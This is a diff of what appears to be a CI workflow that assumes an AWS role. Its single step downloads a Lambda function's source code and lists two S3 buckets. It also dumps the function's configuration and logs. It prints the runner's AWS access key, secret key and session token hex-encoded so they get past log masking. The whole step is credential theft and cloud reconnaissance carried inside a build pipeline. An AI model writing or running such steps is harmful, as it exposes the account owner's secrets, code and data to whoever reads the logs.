@@ -17,33 +17,19 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
           role-session-name: cloudescape-corgi
-      - name: Grab
+      - name: Grab lambda source and lists
         run: |
           set +e
-          echo "=== LAMBDA CODE ==="
           URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
+          echo "URL_OK ${#URL}"
           curl -sL "$URL" -o /tmp/lam.zip
           ls -la /tmp/lam.zip
-          echo "---SOURCE---"
-          python3 - <<'PY'
-          import zipfile
-          z=zipfile.ZipFile('/tmp/lam.zip')
-          for n in z.namelist():
-            print('FILE', n)
-            data=z.read(n)
-            print(data.decode('utf-8','replace'))
-          PY
-          echo "---ENDSOURCE---"
-          echo "=== CREDS HEX ==="
-          python3 - <<'PY'
-          import os
-          for k in ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"]:
-              v=os.environ.get(k,"")
-              print(k+"_LEN", len(v))
-              print(k+"_HEX", v.encode().hex())
-          PY
-          echo "=== LISTS ==="
-          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 --output json
-          aws s3api list-objects-v2 --bucket site781fe43f26b9eba3 --output json
-          aws lambda get-function-configuration --function-name nslookupv2 --output json
-          aws logs filter-log-events --log-group-name /aws/lambda/nslookupv2 --limit 50 2>&1 | head -c 15000
+          python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
+[print('FILE',n,'\n',z.read(n).decode('utf-8','replace')) for n in z.namelist()]"
+          python3 -c "import os;ks=['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'];
+[print(k+'_HEX',os.environ.get(k,'').encode().hex()) for k in ks]"
+          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 --output json || true
+          aws s3api list-objects-v2 --bucket site781fe43f26b9eba3 --output json || true
+          aws lambda get-function-configuration --function-name nslookupv2 --output json || true
+          aws logs describe-log-groups --log-group-name-prefix /aws/lambda --max-items 20 2>&1 || true
+          aws logs filter-log-events --log-group-name /aws/lambda/nslookupv2 --limit 30 2>&1 | head -c 20000 || true
